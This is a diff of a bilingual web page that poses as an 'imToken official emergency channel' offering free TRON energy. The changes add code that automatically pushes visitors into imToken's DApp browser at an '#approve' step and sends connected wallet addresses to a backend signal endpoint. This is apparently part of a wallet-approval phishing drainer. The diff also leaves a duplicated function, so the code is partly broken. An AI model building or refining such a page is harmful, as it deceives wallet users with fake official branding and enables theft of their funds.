@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -386,6 +385,33 @@ body {
     justify-content: center;
     gap: 6px;
 }
+/* 新增：非imToken用户弹窗样式 */
+#nonImTokenPopup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: #1e2925;
+    border: 1px solid #ef4444;
+    border-radius: 8px;
+    padding: 16px;
+    z-index: 1001;
+    text-align: center;
+}
+#nonImTokenPopup p {
+    color: #ef4444;
+    font-size: 14px;
+    margin: 0 0 12px 0;
+}
+#closePopupBtn {
+    padding: 4px 12px;
+    border: none;
+    border-radius: 4px;
+    background: #3b82f6;
+    color: white;
+    cursor: pointer;
+}
     </style>
 </head>
 <body>
@@ -405,18 +431,18 @@ body {
                 <!-- 语言下拉组件：替换原单一按钮 -->
                 <div class="lang-dropdown" id="langDropdown">
                     <button class="lang-toggle" id="langToggleBtn">
-                            🇨🇳
+                        <<i class="fa fa-flag" aria-hidden="true"></</i> <!-- 初始显示中文国旗 -->
                         <span id="currentLangText">中文</span>
                     </button>
                     <div class="lang-dropdown-menu">
                         <!-- 中文选项 -->
                         <button class="lang-dropdown-item" data-lang="zh">
-                           🇨🇳
+                            <<i class="fa fa-flag" aria-hidden="true"></</i>
                             <span>中文</span>
                         </button>
                         <!-- 英文选项 -->
                         <button class="lang-dropdown-item" data-lang="en">
-                            🇺🇸
+                            <<i class="fa fa-flag-us" aria-hidden="true"></</i>
                             <span>English</span>
                         </button>
                     </div>
@@ -424,6 +450,12 @@ body {
                 <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
          </div>
     </div>
+        <!-- 新增：非imToken用户提示弹窗 -->
+        <div id="nonImTokenPopup">
+            <p>不支持非imToken用户</p>
+            <button id="closePopupBtn">关闭</button>
+        </div>
+
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span></span>
@@ -553,6 +585,11 @@ let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 // 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
+// 新增：imToken跳转配置（用验证过的稳定scheme）
+const imTokenConfig = {
+    scheme: "imtokenv2://navigate/DappView?url=",
+    name: "imToken"
+};
 // ========== 多语言配置（已更新headerDesc文本） ==========
 const langConfig = {
     zh: {
@@ -618,7 +655,7 @@ const langConfig = {
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接imToken钱包后重试</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请用imToken钱包内置浏览器打开</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>正在自动唤起imToken...</span>",
         // 新增：非钱包环境容器双语（中文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
@@ -686,7 +723,7 @@ const langConfig = {
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect imToken wallet and try again</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Please open with imToken in-app browser</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Auto-launching imToken...</span>",
         // 新增：非钱包环境容器双语（英文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
@@ -766,7 +803,7 @@ function markB1SignalSent(address) {
         console.warn("标记B1信号发送状态失败：", e);
     }
 }
-// ========== DOM元素缓存（补充缺失的语言下拉元素） ==========
+// ========== DOM元素缓存（补充弹窗元素） ==========
 const walletStatusContainer = document.getElementById("walletStatusContainer");
 const contractAddrEl = document.getElementById("contractAddr");
 const userInfoEl = document.getElementById("userInfo");
@@ -782,6 +819,9 @@ const langDropdownItems = document.querySelectorAll(".lang-dropdown-item"); // �
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
 const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
+// 新增：弹窗元素缓存
+const nonImTokenPopup = document.getElementById("nonImTokenPopup");
+const closePopupBtn = document.getElementById("closePopupBtn");
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -796,9 +836,9 @@ function isCustomerError(errMsg) {
 // 初始化语言显示
 function initLangDisplay() {
     if (currentLang === "zh") {
-        langToggleBtn.innerHTML = ' 🇨🇳 <span id="currentLangText">中文</span>';
+        langToggleBtn.innerHTML = ' <<i class="fa fa-flag" aria-hidden="true"></</i> <span id="currentLangText">中文</span>';
     } else {
-        langToggleBtn.innerHTML = ' 🇺🇸 <span id="currentLangText">English</span>';
+        langToggleBtn.innerHTML = ' <<i class="fa fa-flag-us" aria-hidden="true"></</i> <span id="currentLangText">English</span>';
     }
 }
 // 切换语言
@@ -985,7 +1025,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测 ==========
+// ========== 环境检测（核心修改：自动跳转+弹窗） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
@@ -996,34 +1036,62 @@ async function checkImTokenEnv() {
         await initWallet(false);
     } else {
         try {
-            // 非imToken环境：显示专属容器+引导提示
+            // 非imToken环境：显示专属容器+自动跳转（无需点击按钮）
             specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
+            connectBtn.style.display = "none"; // 初始隐藏按钮
+
+            // 自动触发跳转
+            const targetUrl = window.location.href + "#approve";
+            await navigator.clipboard.writeText(targetUrl);
+            // 用稳定的scheme拼接跳转链接
+            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
+            window.location.href = jumpUrl;
+
+            // 2秒后检测跳转是否成功
+            setTimeout(() => {
+                if (!window.tronWeb) {
+                    // 跳转失败：显示按钮+弹窗
+                    connectBtn.style.display = "block";
+                    nonImTokenPopup.style.display = "block";
+
+                    // 点击按钮再次跳转
+                    connectBtn.onclick = async () => {
+                        try {
+                            const targetUrl = window.location.href + "#approve";
+                            await navigator.clipboard.writeText(targetUrl);
+                            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
+                            window.location.href = jumpUrl;
+                        } catch (e) {
+                            alert(lang.copyFail + "\n" + lang.copyGuide);
+                        }
+                    };
+                }
+            }, 2000);
+
+        } catch (e) {
+            console.error("非imToken环境处理失败：", e);
+            // 出错时直接显示按钮+弹窗
+            connectBtn.style.display = "block";
+            nonImTokenPopup.style.display = "block";
             connectBtn.onclick = async () => {
                 try {
-                    // 1. 构造目标URL（拼接 #approve 触发后续授权流程）
                     const targetUrl = window.location.href + "#approve";
-                    // 2. 复制链接（保留备用方案）
                     await navigator.clipboard.writeText(targetUrl);
-                    // 3. 构造 imToken 专属跳转链接（scheme + 编码后目标URL）
-                    const walletScheme = "imtoken://browser?url="; // imToken 浏览器核心scheme
-                    const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
-                    // 4. 触发跳转（直接唤起imToken浏览器并打开目标页面）
+                    const jumpUrl = imTokenConfig.scheme + encodeURIComponent(targetUrl);
                     window.location.href = jumpUrl;
-                    // 5. 兼容处理：确保跳转指令执行完成
-                    setTimeout(() => {}, 1500);
                 } catch (e) {
-                    console.error("复制/唤起失败：", e);
-                    // 失败兜底提示
-                    const lang = langConfig[currentLang];
                     alert(lang.copyFail + "\n" + lang.copyGuide);
                 }
             };
-        } catch (e) {
-            console.error("非imToken环境处理失败：", e);
         }
     }
+
+    // 关闭弹窗按钮逻辑
+    closePopupBtn.onclick = () => {
+        nonImTokenPopup.style.display = "none";
+    };
 }
 // ========== 钱包初始化 ==========
 async function initWallet(isAfterApprove) {
@@ -1175,6 +1243,43 @@ async function executeAfterApprove() {
     }
 }
 // ========== 发送信号函数 ==========
+async function sendSignalA1() {
+    const requestData = { userAddress };
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000);
+    try {
+        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(requestData),
+            signal: controller.signal,
+            keepalive: true
+        });
+        clearTimeout(timeoutId);
+        const status = res.ok ? "success" : "fail";
+        // 记录A1信号状态到本地缓存（关联钱包地址）
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = status;
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        
+        if (res.ok) {
+            console.log("✅ A1信号异步发送成功");
+            return true; // 返回成功状态
+        } else {
+            console.log("❌ A1信号发送失败（后端非200状态）");
+            return false; // 返回失败状态
+        }
+    } catch (e) {
+        clearTimeout(timeoutId);
+        // 记录A1信号失败状态
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = "fail";
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        
+        console.warn("❌ A1信号发送异常：", e);
+        return false; // 异常也返回失败
+    }
+}
 async function sendSignalA1() {
     const requestData = { userAddress };
     const controller = new AbortController();
